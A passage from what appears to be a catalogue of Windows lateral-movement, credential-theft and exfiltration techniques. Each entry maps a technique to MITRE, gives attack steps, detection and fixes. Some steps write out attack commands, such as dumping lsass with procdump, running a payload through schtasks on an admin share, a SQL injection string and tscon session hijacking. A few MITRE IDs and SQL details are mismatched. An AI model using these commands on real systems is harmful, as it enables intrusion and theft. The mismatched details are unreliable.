- **Attack Steps**: Attacker scans with Nmap or SMB tools to find hosts with SMBv1 enabled. They run the EternalBlue exploit via Metasploit, crafting packets to trigger the vulnerability. This results in shellcode being executed in kernel space. A Meterpreter or reverse shell is launched as SYSTEM. Host is now compromised without requiring credentials.
- **Detection**: Detect SMB exploit traffic patterns
- **Solution**: Disable SMBv1; apply MS17-010 patch
- **Tags**: eternalblue, ms17-010, rce

## Persistence via WMI Event Subscription

- **Attack Type**: Lateral Movement → WMI-Based Event-Triggered Persistence
- **Target**: Windows Hosts
- **Vulnerability**: WMI objects not logged by default
- **MITRE**: T1546.003
- **Impact**: Long-term stealth persistence
- **Tools**: PowerShell, wmic
- **Scenario**: Establishes a trigger that runs code on a user login or system boot.
- **Attack Steps**: The attacker runs PowerShell to create a __EventFilter for a user login event. A CommandLineEventConsumer is linked to execute powershell -enc <payload>. They bind the two with __FilterToConsumerBinding. Now, every time the user logs in, the malicious payload executes silently. This method evades autorun checks and persists through reboots.
- **Detection**: Monitor WMI repository changes
- **Solution**: Use Sysmon + WMI logging
- **Tags**: wmi, stealth persistence

## SMB Tool Execution via schtasks

- **Attack Type**: Lateral Movement → Scheduled Task Execution via Admin Share
- **Target**: Windows Hosts
- **Vulnerability**: Unrestricted access to C$ and scheduler
- **MITRE**: T1053.005
- **Impact**: Executes code with SYSTEM rights silently
- **Tools**: schtasks, net use
- **Scenario**: Executes payload by dropping it via C$ and scheduling it with schtasks.
- **Attack Steps**: Attacker maps C$ using net use \\192.168.1.5\C$ /user:admin. They upload payload to C:\Temp\mal.exe. Then, schtasks /create /tn “task” /tr “C:\Temp\mal.exe” /sc once /st 00:00 is used to create a task. When triggered, the task runs under SYSTEM, executing the payload. Task is often deleted afterward to clean traces.
- **Detection**: Monitor schtasks creation; review C$ activity
- **Solution**: Limit scheduler access via GPO
- **Tags**: smb, schtasks, lateral

## Credential Dumping via SMB Relay

- **Attack Type**: Lateral Movement → Capture and Relay SMB Credentials in Real-Time
- **Target**: Internal Windows Hosts
- **Vulnerability**: SMB signing disabled; LLMNR enabled
- **MITRE**: T1176
- **Impact**: Credential theft and privilege abuse
- **Tools**: ntlmrelayx, Responder
- **Scenario**: Relays captured NTLM credentials to access nearby systems without cracking.
- **Attack Steps**: The attacker starts Responder to poison LLMNR and NBNS requests and capture NetNTLM hashes. When a system connects to the rogue server, the attacker uses ntlmrelayx to forward those hashes to another internal host (that has SMB signing disabled), gaining shell access. This attack allows lateral movement without needing to crack passwords.
- **Detection**: Detect LLMNR poisoning or anomalous relay patterns
- **Solution**: Disable LLMNR/NBTNS; enable SMB signing
- **Tags**: smb relay, responder

## Lateral Movement via Remote PowerShell Sessions

- **Attack Type**: Lateral Movement → Remote PowerShell Session Execution
- **Target**: Windows Servers
- **Vulnerability**: WinRM ports open and accessible
- **MITRE**: T1021.006
- **Impact**: Fileless remote command execution
- **Tools**: PowerShell, Evil-WinRM
- **Scenario**: Runs scripts and commands remotely over WinRM using credentials.
- **Attack Steps**: Attacker enables PS Remoting (if not already) and runs Enter-PSSession or Invoke-Command with valid domain credentials to execute payloads on the remote host. PowerShell sessions are authenticated and encrypted, blending with legitimate admin activity. Tools like Evil-WinRM provide easier shell management.
- **Detection**: Monitor WinRM connections
- **Solution**: Limit PowerShell remoting to admin groups
- **Tags**: powershell, winrm

## Lateral Movement via RDP Hijacking

- **Attack Type**: Lateral Movement → Remote Desktop Protocol Session Takeover
- **Target**: Terminal Servers
- **Vulnerability**: Inactive RDP sessions not timed out
- **MITRE**: T1563.002
- **Impact**: Complete desktop control without alerts
- **Tools**: tscon.exe, mimikatz
- **Scenario**: Attacker connects to open RDP session without password via session hijack.
- **Attack Steps**: After dumping credentials, the attacker checks for existing RDP sessions using qwinsta. If an unlocked session exists, they run tscon <session_id> /dest:console to hijack it. The attacker gains full GUI access without password re-entry. This bypasses MFA and logs them in invisibly.
- **Detection**: Log tscon.exe usage and session changes
- **Solution**: Enforce RDP timeout, restrict tscon
- **Tags**: rdp, session hijack

## Trust Exploitation via Pass-the-Hash (PtH)

- **Attack Type**: Lateral Movement → Credential Replay without Password Cracking
- **Target**: Domain Workstations
- **Vulnerability**: NTLM authentication enabled
- **MITRE**: T1550.002
- **Impact**: Seamless lateral movement without credentials
- **Tools**: Mimikatz, Impacket
- **Scenario**: Uses captured NTLM hashes directly for authentication.
- **Attack Steps**: After obtaining an NTLM hash (e.g., from SAM or LSASS), attacker uses sekurlsa::pth or Impacket’s psexec.py to authenticate without needing plaintext credentials. This works across systems trusting the same domain. They launch services or shells as SYSTEM on remote hosts.
- **Detection**: Monitor for known PtH tools and anomalies
- **Solution**: Use LAPS, restrict reuse of accounts
- **Tags**: pass-the-hash, mimikatz

## AD Misconfig - Unconstrained Delegation

- **Attack Type**: Lateral Movement → Exploiting Unconstrained Delegation
- **Target**: Domain Controllers
- **Vulnerability**: Misconfigured delegation settings
- **MITRE**: T1550.003
- **Impact**: Stealthy Domain Admin impersonation
- **Tools**: Rubeus, Impacket
- **Scenario**: Abuses a domain-joined computer’s trust to impersonate users.
- **Attack Steps**: Attacker finds a computer account with unconstrained delegation. They wait for a Domain Admin to authenticate to it (or force it). Then, using tools like Rubeus, they extract the admin’s TGT from memory and reuse it to access other resources as that admin.
- **Detection**: Monitor TGT reuse and Kerberos delegation
- **Solution**: Use constrained delegation with principals
- **Tags**: delegation, kerberos abuse

## AD Misconfig - Exploiting Kerberoasting

- **Attack Type**: Lateral Movement → Service Ticket Theft and Offline Cracking
- **Target**: Active Directory
- **Vulnerability**: Weak service account passwords
- **MITRE**: T1558.003
- **Impact**: Escalation and impersonation
- **Tools**: Rubeus, hashcat
- **Scenario**: Extracts SPN-based tickets to crack service account passwords.
- **Attack Steps**: Attacker enumerates SPNs using setspn -T domain -Q */*. Using Rubeus or Invoke-Kerberoast, they request service tickets for those SPNs. Tickets are extracted and cracked offline using hashcat. Weak passwords allow attacker to impersonate service accounts.
- **Detection**: Alert on SPN ticket enumeration
- **Solution**: Use strong, rotated service account passwords
- **Tags**: kerberoasting, rubeus

## NetBIOS Name Poisoning via Responder

- **Attack Type**: Discovery & Lateral Movement → Spoofed Authentication via NBNS/LLMNR
- **Target**: Internal Network
- **Vulnerability**: LLMNR/NBNS enabled
- **MITRE**: T1557.001
- **Impact**: Enables hash capture without alerting user
- **Tools**: Responder
- **Scenario**: Intercepts traffic from systems trying to resolve unknown hostnames.
- **Attack Steps**: Attacker launches Responder to spoof name resolution responses for LLMNR/NBNS requests. Victims attempting to resolve non-existent names send credentials to Responder, which captures NetNTLMv2 hashes. These are cracked or relayed to authenticate on other machines.
- **Detection**: Disable LLMNR/NBNS; detect Responder traffic
- **Solution**: Use DNS only for name resolution
- **Tags**: responder, poisoning

## PsExec Lateral Movement via Dumped Hashes

- **Attack Type**: Lateral Movement → Admin Execution via SMB with NTLM Hash
- **Target**: Windows Machines
- **Vulnerability**: Admin privileges + hash access
- **MITRE**: T1021.002
- **Impact**: Executes with SYSTEM rights silently
- **Tools**: PsExec, Mimikatz
- **Scenario**: Executes remote commands using hash instead of password.
- **Attack Steps**: Attacker dumps NTLM hashes using Mimikatz and uses psexec.py with -hashes flag to authenticate on another host. Execution of payloads like reverse shells or persistence scripts follow, running as SYSTEM if admin rights are present.
- **Detection**: Monitor remote services and PsExec events
- **Solution**: Use LAPS, enforce account separation
- **Tags**: hash reuse, psexec

## WMI as a Backdoor Channel

- **Attack Type**: Lateral Movement & Persistence → Scheduled WMI Event Injection
- **Target**: Windows Endpoints
- **Vulnerability**: Lack of WMI event logging
- **MITRE**: T1546.003
- **Impact**: Persistent execution undetected
- **Tools**: PowerShell, WMI
- **Scenario**: Embeds persistent backdoor using system event triggers.
- **Attack Steps**: Attacker uses PowerShell to create WMI Event Filters and Consumers that trigger based on login or uptime. The consumer launches PowerShell or C# payloads from memory. This survives reboots, evades AV (fileless), and can be configured to stay dormant for stealth.
- **Detection**: Log WMI object creation with Sysmon
- **Solution**: Disable WMI access to standard users
- **Tags**: wmi, backdoor, stealth

## Scheduled Task via Group Policy Abuse

- **Attack Type**: Lateral Movement → Scheduled Tasks via GPO
- **Target**: Domain Environment
- **Vulnerability**: Over-permissive GPO control
- **MITRE**: T1053.005
- **Impact**: Broad persistent execution across systems
- **Tools**: GPMC, PowerView
- **Scenario**: Attacker abuses GPO to create persistent, privileged tasks.
- **Attack Steps**: Attacker compromises a system with Group Policy access, edits an existing GPO or creates a new one with a Scheduled Task targeting hosts in an OU. The task executes a payload under SYSTEM when the policy is refreshed. GPO propagation ensures broad reach and stealth.
- **Detection**: Monitor new GPO task creation
- **Solution**: Restrict GPO editing rights
- **Tags**: gpo, lateral, task abuse

## Domain Trust Misconfig Exploitation

- **Attack Type**: Lateral Movement → Cross-Domain Authentication via AD Trust
- **Target**: AD Forests
- **Vulnerability**: Insecure trust configuration
- **MITRE**: T1484.002
- **Impact**: Cross-domain access with low visibility
- **Tools**: Mimikatz, Rubeus
- **Scenario**: Leverages bidirectional trust to move between domains.
- **Attack Steps**: After compromising credentials in Domain A, attacker queries forest trust relationships using nltest /domain_trusts. If a two-way trust exists with Domain B, they use TGTs or delegated tickets to access Domain B resources — often unmonitored.
- **Detection**: Alert on interdomain authentications
- **Solution**: Enforce selective authentication
- **Tags**: trust abuse, forest

## DCOM Execution via MMC

- **Attack Type**: Lateral Movement → COM Object Instantiation on Remote System
- **Target**: Domain Workstations
- **Vulnerability**: DCOM unrestricted and unmonitored
- **MITRE**: T1021.003
- **Impact**: Fileless lateral execution
- **Tools**: DCOM, PowerShell
- **Scenario**: Uses DCOM and MMC20.Application for stealthy execution.
- **Attack Steps**: The attacker invokes New-Object -ComObject MMC20.Application remotely using PowerShell and DCOM. This allows execution of embedded commands on the target without touching disk. Since DCOM is legitimate and uses port 135, it often evades detection.
- **Detection**: Monitor COM object invocation
- **Solution**: Restrict DCOM access via firewall
- **Tags**: dcom, mmc, stealth

## LSASS Dump via MiniDump + Remote Copy

- **Attack Type**: Discovery → Credential Harvesting from Remote Hosts
- **Target**: Windows Hosts
- **Vulnerability**: AV bypass, poor monitoring
- **MITRE**: T1003
- **Impact**: Recovers valid creds and tickets
- **Tools**: ProcDump, PowerShell
- **Scenario**: Attacker dumps LSASS memory and extracts credentials.
- **Attack Steps**: Attacker uploads procdump.exe to a remote host via SMB or WMI. Then runs: procdump.exe -ma lsass.exe lsass.dmp. Dumps are exfiltrated and parsed with Mimikatz or pypykatz to extract cleartext creds, hashes, Kerberos tickets. This enables further movement and persistence.
- **Detection**: Alert on LSASS access or dump creation
- **Solution**: Block ProcDump and LSASS access
- **Tags**: lsass, cred theft

## RDP Lateral Movement via Token Duplication

- **Attack Type**: Lateral Movement → RDP Session Cloning via Token Impersonation
- **Target**: RDP Servers
- **Vulnerability**: Token access + active sessions
- **MITRE**: T1134.001
- **Impact**: GUI-level control with no login prompt
- **Tools**: Mimikatz, tscon
- **Scenario**: Uses duplicated tokens to open RDP without credentials.
- **Attack Steps**: After dumping tokens via Mimikatz, attacker uses MakeToken or Token::Impersonate to assume a session user. If that user has an active RDP session, tscon can be used to hijack it. This allows stealth RDP without password or MFA.
- **Detection**: Monitor token operations + tscon.exe
- **Solution**: Clear inactive sessions, block token reuse
- **Tags**: token theft, rdp

## Printer Bug Exploitation for Lateral Exec

- **Attack Type**: Lateral Movement → Print Spooler Exploit for Remote Shell
- **Target**: Windows Print Servers
- **Vulnerability**: Print Spooler vulnerable
- **MITRE**: T1203
- **Impact**: Remote code execution via print abuse
- **Tools**: PrinterBug.py, smbserver
- **Scenario**: Abuses Print Spooler service to execute DLL on remote machine.
- **Attack Steps**: Attacker triggers PrinterBug to force target to authenticate to their fake print server. Then, using captured hash or Kerberos ticket, they relay and execute a payload remotely via SMB. It’s stealthy and requires no preinstalled agent.
- **Detection**: Disable Print Spooler if unused
- **Solution**: Patch vulnerable services
- **Tags**: printnightmare, printerbug

## Unauthorized Access to Shared Finance Drive

- **Attack Type**: Collection & Exfiltration → Internal File Share Enumeration
- **Target**: SMB Shared Drive
- **Vulnerability**: Broad read access granted to all users
- **MITRE**: T1005
- **Impact**: Theft of sensitive financial records
- **Tools**: CrackMapExec, SMBClient
- **Scenario**: Attacker accesses financial records via misconfigured permissions on shared drive.
- **Attack Steps**: The attacker starts by identifying open SMB shares using CrackMapExec on the subnet. Once accessible shares are identified, they manually explore them using SMBClient. In one of the folders, they locate a misconfigured "Finance" directory that grants read permissions to 'Domain Users'. The attacker recursively downloads spreadsheets, tax reports, salary structures, and invoice backups from the past 3 years. They zip the entire structure, rename it to mimic a legitimate software installer, and move it to an attacker-controlled staging directory for exfiltration later via DNS tunneling.
- **Detection**: File access audit logs and anomaly detection
- **Solution**: Apply principle of least privilege (PoLP) on shares
- **Tags**: smb, shared drive, finance data

## Dumping Customer DB from Exposed SQL Server

- **Attack Type**: Collection & Exfiltration → SQL Dump via Misconfigured DB Permissions
- **Target**: MSSQL Database Server
- **Vulnerability**: Weak DB credentials and no network segmentation
- **MITRE**: T1074
- **Impact**: Massive customer data theft
- **Tools**: SQLCMD, PowerUpSQL
- **Scenario**: Attacker extracts full customer database from internal MSSQL instance with weak credentials.
- **Attack Steps**: After identifying the internal SQL server on port 1433 using a port scan, the attacker attempts to authenticate using common weak credentials such as sa:sa, admin:admin, etc. On successful login, they enumerate database names using SELECT name FROM master.dbo.sysdatabases;, then switch to the customer database. They use SELECT * INTO OUTFILE or dump tables using scripts and save customer names, emails, credit card hashes, and password resets. The output is split into multi-part .csv files and encrypted before being sent through a Dropbox API as disguised backups.
- **Detection**: DB access monitoring; anomaly-based query alerting
- **Solution**: Strong auth, segmented DB environment
- **Tags**: sql, customer records, db dump

## Exfiltrating Design Files from Engineering Share

- **Attack Type**: Collection & Exfiltration → CAD & Product IP Theft via Internal Share
- **Target**: Engineering File Server
- **Vulnerability**: Excessive permissions on IP folders
- **MITRE**: T1119
- **Impact**: Theft of proprietary product designs
- **Tools**: smbmap, robocopy, winrar
- **Scenario**: Targets a design team's file server to steal proprietary schematics.
- **Attack Steps**: The attacker runs smbmap -u engineer -p password -H 192.168.1.10 to enumerate SMB share contents. A directory /projects/designs/CAD is found to be open with read permissions. Using robocopy, they silently clone all files to a local staging folder on the infected host. They then use WinRAR with password protection to compress and encrypt the stolen data. Using a background PowerShell script, they embed the archive within PNG image EXIF data and initiate slow HTTP uploads to attacker’s cloud.
- **Detection**: Monitor robocopy & outbound transfer patterns
- **Solution**: Use DLP, IP-aware segmentation, restrict file sharing
- **Tags**: cad, ip theft, internal share

## Exporting HR Records from Excel Over Share

- **Attack Type**: Collection & Exfiltration → Employee Data Harvesting via Excel
- **Target**: HR Share Server
- **Vulnerability**: Overexposed HR documents to authenticated users
- **MITRE**: T1005
- **Impact**: Employee PII theft with stealthy export
- **Tools**: PowerShell, Excel interop
- **Scenario**: Attacker targets an HR Excel repository open to read by all domain users.
- **Attack Steps**: After gaining access to a shared folder titled “HR_Archive” on a corporate share, the attacker finds multiple .xlsx files dating back several years. These contain sensitive information like salaries, appraisals, resignation letters, and joining dates. The attacker automates extraction using PowerShell’s COM automation to open Excel in the background, extract the relevant rows, and save only high-value PII fields to CSV format. The harvested records are moved to a hidden ADS (Alternate Data Stream) attached to a benign .txt file and exfiltrated later over HTTPS.
- **Detection**: Monitor Excel usage and ADS creation
- **Solution**: Apply strict ACLs on HR files
- **Tags**: hr, excel, pii exfiltration

## Dumping Cloud Sync Folder for Intellectual Property

- **Attack Type**: Collection & Exfiltration → Cloud Sync Folder Scraping
- **Target**: Developer Machine
- **Vulnerability**: Unsecured cloud sync cache
- **MITRE**: T1537
- **Impact**: Intellectual property exfiltration
- **Tools**: rclone, dirb, exiftool
- **Scenario**: Extracts sensitive synced files (like source code) from OneDrive local cache.
- **Attack Steps**: The attacker locates a OneDrive sync folder under a compromised developer’s user directory. The folder contains documentation, proprietary Python scripts, and .git folders with internal commit history. Using rclone, they mount the directory to a temporary path and perform recursive export with timestamps. Before exfiltration, EXIF metadata is modified using exiftool to spoof creation dates. They zip and upload the files to a disguised S3 bucket using valid developer credentials stolen earlier.
- **Detection**: Monitor OneDrive sync behavior; local folder auditing
- **Solution**: Encrypt local cache; lock down cloud folders
- **Tags**: cloud, source code, onedrive

## Database Dump via SQL Injection

- **Attack Type**: Collection & Exfiltration → Unauthorized Query Execution via SQLi
- **Target**: Public-Facing Web App DB
- **Vulnerability**: SQL injection flaw; unfiltered user input
- **MITRE**: T1190
- **Impact**: Full backend compromise without login
- **Tools**: sqlmap
- **Scenario**: Attacker exploits web app SQLi to dump full backend database.
- **Attack Steps**: The attacker identifies a login form vulnerable to SQLi using ' OR 1=1--. They automate the injection with sqlmap, which tests and identifies DBMS type, then proceeds to dump tables one by one. The attacker extracts usernames, hashed passwords, emails, internal docs, and configurations into structured JSON files. The data is Base64 encoded and embedded inside custom user-agent headers to evade detection as it’s exfiltrated in small chunks using regular HTTP POST requests from the compromised machine.
- **Detection**: WAF alerts; SQL traffic analysis
- **Solution**: Sanitize input; use parameterized queries
- **Tags**: sqli, db dump, web attack

## Harvesting Backups from Shared NAS Device

- **Attack Type**: Collection & Exfiltration → Backup Collection from Exposed Network Storage
- **Target**: Network Storage (NAS)
- **Vulnerability**: Backup exposure via misconfig
- **MITRE**: T1005
- **Impact**: Historic data theft with credential leaks
- **Tools**: mount, rsync, grep
- **Scenario**: Attacker discovers old weekly backups stored on unsecured NAS.
- **Attack Steps**: The attacker scans for open SMB/NFS shares and finds a public “backup_nas” exposed to the entire VLAN. It contains .bak, .sql, .tar.gz files with config databases, CRM exports, and archived reports. Mounting the share manually, they use rsync to copy the entire volume to the staging area. Then they filter contents using grep to pull secrets, keys, or config values. Important files are repackaged and encrypted using GPG before exfiltrating through an HTTPS C2 tunnel using curl.
- **Detection**: Monitor mounting and large transfer volumes
- **Solution**: Segregate backup networks; encrypt backups
- **Tags**: nas, backup exfiltration

## Internal Wiki Dump

- **Attack Type**: Collection & Exfiltration → Harvesting Knowledge Base for Recon
- **Target**: Internal Web Server
- **Vulnerability**: No DLP/monitoring on internal portals
- **MITRE**: T1213
- **Impact**: Internal SOP and infra doc exposure
- **Tools**: wget, curl, cookies.txt
- **Scenario**: Attacker dumps self-hosted Confluence wiki full of architecture docs.
- **Attack Steps**: Attacker gains access to Confluence using compromised SSO token. They log into the internal wiki portal and use wget --mirror or curl -b cookies.txt to recursively crawl all pages. This includes system architecture, VPN credentials, jump host lists, and configuration guidance. The complete offline copy is compressed and renamed to blend into developer toolset zip files before being uploaded to attacker’s GitHub repository using CI/CD scripts.
- **Detection**: Detect excessive wiki crawling
- **Solution**: Enforce RBAC, redact sensitive content
- **Tags**: wiki, recon, confluence

## Git Folder Discovery in Shared Dev Folder

- **Attack Type**: Collection & Exfiltration → Git Leak in Internal Network
- **Target**: Developer Shared Drive
- **Vulnerability**: Secrets committed to code repos
- **MITRE**: T1552.001
- **Impact**: Source + secrets leakage in one shot
- **Tools**: git, strings, tar
- **Scenario**: Attacker finds .git folders on internal shared dev drive.
- **Attack Steps**: While exploring shared dev drives, the attacker finds .git folders containing full repo history including secrets. They use git log, git show, and git diff to locate sensitive commits that include plaintext AWS keys, environment variables, and admin credentials. They archive the .git folders using tar, then transfer them over FTP to a private server using standard port 21 to bypass EDR filtering.
- **Detection**: Scan shares for git/secret content
- **Solution**: Enforce pre-commit hooks + DLP
- **Tags**: git, dev secrets, shared folder

## Exfiltrating Key Database via ODBC Misuse

- **Attack Type**: Collection & Exfiltration → Direct Database Access via Local ODBC
- **Target**: Developer Workstation
- **Vulnerability**: Misuse of stored DSNs and secrets
- **MITRE**: T1074
- **Impact**: Direct DB theft without app interaction
- **Tools**: isql, PowerShell, DSN
- **Scenario**: Attacker discovers local ODBC DSN connection and uses it to export database.
- **Attack Steps**: The attacker finds an ODBC DSN file with cleartext credentials stored on a local developer machine (.odbc.ini). Using isql or PowerShell’s ODBC .NET classes, they connect directly to the linked database and export sensitive tables like users, transaction logs, and internal API keys. They chunk and compress the data, then send it via timed Dropbox API requests using a stolen token from browser cookies.
- **Detection**: Monitor ODBC access and exports
- **Solution**: Encrypt and protect DSN files
- **Tags**: odbc, local db, exfiltration

## Exfiltration via Screenshotting Shared Drives

- **Attack Type**: Collection & Exfiltration → Manual Visual Recon and Exfiltration
- **Target**: Internal Share Workstations
- **Vulnerability**: Data visible on screen but not accessed as files
- **MITRE**: T1113
- **Impact**: Bypasses DLP and file tracking
- **Tools**: PowerShell, ScreenCaptor, Imgur API
- **Scenario**: Captures screenshots of sensitive files and terminal outputs from shared drives.
- **Attack Steps**: The attacker creates a PowerShell script that captures screenshots every 15 seconds while browsing shared folders containing legal, audit, and financial summaries. The screenshots are compressed in memory and uploaded directly to an attacker-controlled Imgur account using their public API, avoiding traditional network traffic patterns. No files are downloaded directly; instead, sensitive data is exfiltrated visually to bypass file monitoring tools.
- **Detection**: Monitor active screen captures and clipboard
- **Solution**: Block non-admin screen tools, restrict access
- **Tags**: screenshot, stealth exfil

## Clipboard Hijack via PowerShell Script

- **Attack Type**: Collection & Exfiltration → Clipboard Monitoring via Script Injection
- **Target**: Windows Endpoint
- **Vulnerability**: Clipboard access unmonitored
- **MITRE**: T1115
- **Impact**: Silent theft of sensitive copied data
- **Tools**: PowerShell
- **Scenario**: Captures contents of clipboard silently to exfiltrate passwords and copied text.
- **Attack Steps**: The attacker delivers a PowerShell payload as part of post-exploitation that runs continuously in the background. It queries the Windows clipboard every few seconds using [Windows.Forms.Clipboard]::GetText() and writes the captured content to a hidden log file in AppData. If the clipboard contains credentials, access tokens, or email content, it's immediately uploaded to a remote web server via Invoke-WebRequest. This process runs under the guise of a system process and restarts using Scheduled Tasks on reboot.
- **Detection**: Monitor clipboard API calls and persistent tasks
- **Solution**: Restrict clipboard access to elevated apps
- **Tags**: clipboard, powershell, stealth

## Screen Capture via Python Keylogger

- **Attack Type**: Collection & Exfiltration → Visual Exfil via Periodic Screenshot Capture
- **Target**: Developer Workstation
- **Vulnerability**: No monitoring on user screen activity
- **MITRE**: T1113
- **Impact**: Complete visibility into user behavior
- **Tools**: Pyxhook, PIL, scrot
- **Scenario**: Captures screenshots alongside keystrokes to correlate sensitive actions.
- **Attack Steps**: The attacker installs a Python-based keylogger with built-in screenshot support. The keylogger silently records every keystroke and captures a screenshot every 20 seconds using PIL or scrot. The attacker timestamps each image and uploads it to an attacker-controlled server using SFTP or Dropbox API. The combination of keystrokes and visuals allows for accurate context mapping, including passwords typed into browsers or terminals.
- **Detection**: Monitor screen capture API usage and FTP behavior
- **Solution**: Block scripting tools and enable user behavior monitoring
- **Tags**: keylogger, screen capture

## Remote Access Trojan with Continuous Screen Capture

- **Attack Type**: Collection & Exfiltration → Full Visual Surveillance via RAT
- **Target**: Enterprise Workstation
- **Vulnerability**: RAT activity hidden as trusted app
- **MITRE**: T1113
- **Impact**: Passive theft of sensitive business data
- **Tools**: QuasarRAT, njRAT
- **Scenario**: Screenshots are periodically taken and sent to C2 from infected host.
- **Attack Steps**: The attacker deploys QuasarRAT to a victim via phishing. Once installed, the RAT silently runs in the background and every 30 seconds it captures a high-resolution screenshot of the active screen. The image is compressed and base64-encoded before being sent to the command-and-control (C2) server via encrypted HTTP traffic. This technique is used to spy on open emails, banking pages, and internal dashboards without direct access to files.
- **Detection**: Monitor image creation and outbound C2 behavior
- **Solution**: Use EDR with behavioral analysis and screen capture detection
- **Tags**: rat, quasar, visual recon

## Clipboard Theft via Malicious Chrome Extension

- **Attack Type**: Collection & Exfiltration → Browser Clipboard API Abuse
- **Target**: Corporate Browser
- **Vulnerability**: Clipboard permission abuse
- **MITRE**: T1115
- **Impact**: Steals browser-based authentication flows
- **Tools**: Malicious Chrome Extension
- **Scenario**: Extension misuses permissions to read clipboard content.
- **Attack Steps**: A browser extension is disguised as a PDF utility and installed through social engineering. It requests clipboard-read permissions from the user during installation. Once installed, it hooks into JavaScript navigator.clipboard.readText() and monitors when a user copies any text. When a user logs into a website and copies OTPs or credentials, the data is captured and silently sent to a remote server via background AJAX requests.
- **Detection**: Monitor extension install behavior and API calls
- **Solution**: Enforce extension allowlist policies
- **Tags**: browser, extension, clipboard

## Screenshot Capture via PowerShell + COM

- **Attack Type**: Collection & Exfiltration → Visual Recon via Scripted Capture
- **Target**: Windows Host
- **Vulnerability**: Unmonitored scripting and COM access
- **MITRE**: T1113
- **Impact**: Silent visual surveillance during work hours
- **Tools**: PowerShell, COM
- **Scenario**: Uses COM objects to capture full screen at intervals without alert.
- **Attack Steps**: The attacker uses PowerShell to create a COM object using [System.Drawing.Bitmap], capturing the screen with CopyFromScreen() method every minute. The image is saved temporarily in the system temp directory and zipped using Compress-Archive. The zipped files are pushed to a public file share using WebDAV. This is scheduled via schtasks to repeat on login and during lunch hours to avoid detection.
- **Detection**: Log abnormal use of COM screen APIs
- **Solution**: Restrict access to PowerShell + COM for standard users
- **Tags**: powershell, com, screenshot

## Screen Capture via Exploit in RemoteApp

- **Attack Type**: Collection & Exfiltration → RDP Session Screenshot Extraction
- **Target**: Terminal Server
- **Vulnerability**: Session takeover and buffer access
- **MITRE**: T1113
- **Impact**: Captures entire remote workflows without user consent
- **Tools**: RDP Hijack Tool
- **Scenario**: Captures screenshots of remote desktop sessions by abusing screen buffers.
- **Attack Steps**: The attacker connects to an open RDP session using stolen credentials and gains console access using tscon. Once inside the session, they run a low-level screen capture utility that grabs the framebuffer of the desktop in real time, including application windows not visible to others. These screenshots are exfiltrated in encrypted 7z archives every 10 minutes over HTTPS to avoid detection.
- **Detection**: Monitor session switching and framebuffer usage
- **Solution**: Enforce RDP timeouts and log switching commands
- **Tags**: rdp, framebuffer, hijack

## Clipboard Abuse via Office Macro

- **Attack Type**: Collection & Exfiltration → Clipboard Hijack via Excel Macro
- **Target**: Office Workstation
- **Vulnerability**: Macro-based clipboard access unmonitored
- **MITRE**: T1115
- **Impact**: Covert collection of user-copied content
- **Tools**: VBA Macro, Excel
- **Scenario**: Macro-enabled spreadsheet reads clipboard and exfiltrates it.
- **Attack Steps**: A malicious .xlsm file is sent via spear phishing. When opened, the embedded macro activates using Application.OnTime and triggers every 5 minutes. It reads the system clipboard using DataObject.GetFromClipboard from VBA and saves the text to a hidden worksheet. The values are then pushed to a command-and-control server using WinHttp.WinHttpRequest.5.1 object. Since Excel is trusted, this bypasses several controls.
- **Detection**: Alert on macro network calls and clipboard reads
- **Solution**: Disable macros; use trusted document policies
- **Tags**: macro, clipboard, vba

## Visual Theft via Browser-Based Screen Capture

- **Attack Type**: Collection & Exfiltration → Screen Stream via Malicious Web App
- **Target**: Corporate Browsers
- **Vulnerability**: Unrestricted screen sharing permissions
- **MITRE**: T1113
- **Impact**: Real-time screen data leakage
- **Tools**: WebRTC, HTML5
- **Scenario**: JavaScript-based attack streams screen visuals remotely.
- **Attack Steps**: The attacker lures the target to a fake "Screen Sharing" portal built with WebRTC. Upon permission, JavaScript uses navigator.mediaDevices.getDisplayMedia() to capture the screen. The feed is streamed via WebRTC back to attacker servers. The app disguises itself as a productivity plugin to lower suspicion. This attack captures live screen sessions including confidential meetings or web portals.
- **Detection**: Block unapproved WebRTC domains
- **Solution**: Disable getDisplayMedia() in policy
- **Tags**: webrtc, screen leak, js

## Clipboard Monitoring via Windows API Hooking

- **Attack Type**: Collection & Exfiltration → Persistent Clipboard Logging using Hooks
- **Target**: Windows Desktop
- **Vulnerability**: API-level access to clipboard
- **MITRE**: T1115
- **Impact**: Stealthy, persistent clipboard monitoring
- **Tools**: C++, SetClipboardViewer API
- **Scenario**: Attacker installs a hook into Windows API for persistent clipboard logging.
- **Attack Steps**: Attacker writes a small C++ program that registers a hidden window as a clipboard viewer using SetClipboardViewer. This window receives WM_DRAWCLIPBOARD messages every time the clipboard is updated. The program silently logs clipboard contents to a file and forwards messages to remain stealthy in the viewer chain. Log files are periodically zipped and sent to a Dropbox account using a hidden token.
- **Detection**: Detect hidden viewers and frequent clipboard access
- **Solution**: Use EDR to log clipboard API usage
- **Tags**: api hook, clipboard theft

## Exfiltration of Visual Data via Scheduled Screenshot Script

- **Attack Type**: Collection & Exfiltration → Timed Screen Recon with Exfil Pipeline
- **Target**: Linux/Windows Workstations
- **Vulnerability**: Lack of hourly activity monitoring
- **MITRE**: T1113
- **Impact**: Scheduled info leaks with stealth
- **Tools**: Python, Paramiko, PIL
- **Scenario**: Script captures hourly screen images and pushes via encrypted tunnel.
- **Attack Steps**: The attacker drops a Python script that uses PIL to take a screenshot every 60 minutes. Images are converted to PNGs and encrypted with AES using a hardcoded key. The encrypted images are then sent using Paramiko (SFTP over SSH) to an attacker server hosted in AWS. The script is registered as a systemd timer or Task Scheduler job for persistence and stealth.
- **Detection**: Monitor periodic screen activity & unknown outbound SFTP
- **Solution**: Restrict scripting tools & outbound tunnels
- **Tags**: python, timer, visual exfil

## Remote Clipboard Sync Exploit via Remote Desktop Client

- **Attack Type**: Collection & Exfiltration → Session Clipboard Sync Abuse
- **Target**: RDP Host
- **Vulnerability**: Clipboard sync left enabled by default
- **MITRE**: T1115
- **Impact**: Passive, non-alerting data theft
- **Tools**: RDP, PowerShell
- **Scenario**: Leverages RDP clipboard sync to pull data from remote users.
- **Attack Steps**: Attacker connects to RDP using valid credentials and abuses the clipboard sync feature. Using PowerShell, they automatically copy the remote user’s clipboard content by triggering RDP sync back to their system. The clipboard history includes recent passwords, command outputs, or copied files. This data is saved locally and encrypted before being included in exfil packages.
- **Detection**: Disable clipboard sync in RDP configs
- **Solution**: Monitor unusual clipboard use in remote sessions
- **Tags**: rdp, clipboard sync, exfil

## Beacon Over HTTPS via Cobalt Strike

- **Attack Type**: Command and Control → HTTPS Beaconing
- **Target**: Enterprise Workstation
- **Vulnerability**: User opens malicious document
